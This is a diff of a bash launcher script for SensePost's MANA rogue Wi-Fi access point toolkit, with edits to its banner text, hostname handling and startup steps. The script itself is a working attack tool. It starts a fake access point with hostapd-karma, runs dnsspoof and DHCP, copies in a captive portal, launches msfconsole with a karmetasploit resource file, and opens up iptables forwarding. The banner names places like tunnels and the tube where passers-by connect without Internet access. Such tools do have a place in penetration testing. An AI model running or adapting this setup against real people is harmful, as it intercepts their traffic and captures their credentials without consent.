@@ -1,9 +1,10 @@
 #!/bin/bash
 # Original script by Dominic White and Ian de Villiers
-# Changes made by John & Daniel Cuthbert 
+# Changes made by John & Daniel Cuthbert
 
 # Other Useful variables defined
 upstream=eth0
+hostname=WRT54G
 # phy=wlan0
 conf=/root/mana/run-mana/conf/hostapd-karma.conf
 hostapd=/root/mana/hostapd-manna/hostapd/hostapd
@@ -18,20 +19,20 @@ echo -e "\033[38;5;220m Welcome to SensePost's MANA \033[39m"
 echo -e
 echo -e "\033[38;5;220m Making Rogue Access Points fun for all \033[39m"
 echo -e "\033[38;5;220m @SensePost / http://sensepost.com \033[39m"
-echo 
-echo -e "\033[38;5;220m This script starts up will start MANA in no \033[39m"
-echo -e "\033[38;5;220m upstream mode but with the EAP attack \033[39m"
+echo
+echo -e "\033[38;5;220m This script will start MANA in a no \033[39m"
+echo -e "\033[38;5;220m upstream mode, with a captive portal and EAP attack. \033[39m"
+echo -e "\033[38;5;220m enabled. \033[39m"
 echo -e
 echo -e "\033[38;5;220m This is useful in places where people often \033[39m"
 echo -e "\033[38;5;220m leave their Wi-Fi turned on but there is no \033[39m"
 echo -e "\033[38;5;220m Internet connection (tunnels, the tube etc.) \033[39m"
 echo -e
-echo -e "\033[38;5;220m This mode also contains the captive portal \033[39m"
 echo -e
-echo -e 
+echo -e
 echo -e "\033[38;5;220m This assumes you cloned the git repo into /root/mana"
 echo -e
-echo -e 
+echo -e
 echo -e "\033[38;5;220m Press ENTER to continue \033[39m"
 echo -e
 echo -e "\033[38;5;220m--------------------------------------------------\033[39m"
@@ -53,12 +54,12 @@ echo -e "\033[38;5;220mWould you like to proceed?\033[39m"
 echo -e
 echo -e "\033[38;5;220mENTER y/n\033[39m"
 read yn
-if [ $yn == "$S1" ]
-then
-	echo -e "\033[38;5;120m Checking for an active network connection on eth0\033[39m"
+	if [ $yn == "$S1" ]
+			then
+					echo -e "\033[38;5;120m Checking for an active network connection on eth0\033[39m"
 
-elif [ $yn == "$S2" ]
-then
+				elif [ $yn == "$S2" ]
+					then
 	echo -e "\033[38;5;160mEXITING...${nc}\033[39m" && exit
 
 else
@@ -68,14 +69,12 @@ fi
 
 # This detects wireless interfaces and exits if no suitable interfaces are found
 
-ntst="$(ping 8.8.8.8 -c 1 -I eth0 | grep received | cut -f 2 -d ',' | cut -f 2 -d ' ')"  
-if [ "${ntst}" = '1' ]
-	then
-		echo -e "\033[38;5;120m Whoop!! an active network connection has been detected\033[39m"
-
-	else
-		echo -e "\033[38;5;160m Arse, no active network connection was detected, You should fix this, I'm going to exit now\033[39m" && exit
-
+ntst="$(ping 8.8.8.8 -c 1 -I eth0 | grep received | cut -f 2 -d ',' | cut -f 2 -d ' ')"
+	if [ "${ntst}" = '1' ]
+			then
+				echo -e "\033[38;5;120m Whoop!! an active network connection has been detected\033[39m"
+			else
+				echo -e "\033[38;5;160m Arse, no active network connection was detected, You should fix this, I'm going to exit now\033[39m" && exit
 fi
 
 }
@@ -132,15 +131,15 @@ mstrchk
 # figure out how to change this back to the orignial hostname when finished...perhaps assign the output of <echo /etc/hostname> to a variable and then run <hostname ${vairable name}>???
 function nmchng()
 {
-echo -e "${grn}[+]${nc} Temporarily changing hostname to ${red}WRT54G${nc}."  # Will this change only affect this terminal session.?"
-hostname WRT54G
-echo hostname WRT54G
+echo -e "${grn}[+]${nc} Temporarily changing hostname to ${red}$hostname${nc}."  # Will this change only affect this terminal session.?"
+hostname $hostname
+echo hostname $hostname
 sleep 2
 }
 
 nmchng
 
-# Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
+# Get the FIFO for the crack stuffs. Create the FIFO and kick off python process
 export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
 echo $EXNODE
 mkfifo $EXNODE
@@ -151,6 +150,7 @@ rfkill unblock wlan
 
 
 # Start hostapd
+echo -e "${grn}[+]${nc} Setting up interfaces, DHCPD and DNS spoofing"
 sed -i "s/^interface=.*$/interface=$phy/" $conf
 sed -i "s/^bss=.*$/bss=$phy0/" $conf
 sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /root/mana/run-mana/conf/karmetasploit.rc
@@ -167,11 +167,19 @@ dhcpd -cf /root/mana/run-mana/conf/dhcpd.conf $phy
 dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf /root/mana/run-mana/conf/dhcpd-two.conf $phy0
 dnsspoof -i $phy -f /root/mana/run-mana/conf/dnsspoof.conf&
 dnsspoof -i $phy0 -f /root/mana/run-mana/conf/dnsspoof.conf&
+
+echo "${grn}[+]${nc}Pushing captive portal apache virtual host confs into main apache dir"
+cp /root/mana/apache/etc/apache2/sites-enabled/* /etc/apache2/sites-enabled
+sleep 3
+echo "${grn}[+]${nc}All done, now starting Apache, Tinyproxy and msfconsole (this will take a while)"
+
 service apache2 start
 service stunnel4 start
 tinyproxy -c /root/mana/run-mana/conf/tinyproxy.conf&
 msfconsole -r /root/mana/run-mana/conf/karmetasploit.rc&
+sleep 20
 
+echo "${grn}[+]${nc}Setting up iptables rules"
 echo '1' > /proc/sys/net/ipv4/ip_forward
 iptables --policy INPUT ACCEPT
 iptables --policy FORWARD ACCEPT
@@ -179,7 +187,8 @@ iptables --policy OUTPUT ACCEPT
 iptables -F
 iptables -t nat -F
 
-echo "Hit enter to kill me"
+echo "${grn}[+]${nc}MANA is now running. If you wish to exit MANA, please press the enter key"
+
 read
 pkill hostapd
 rm /tmp/crackapd.run
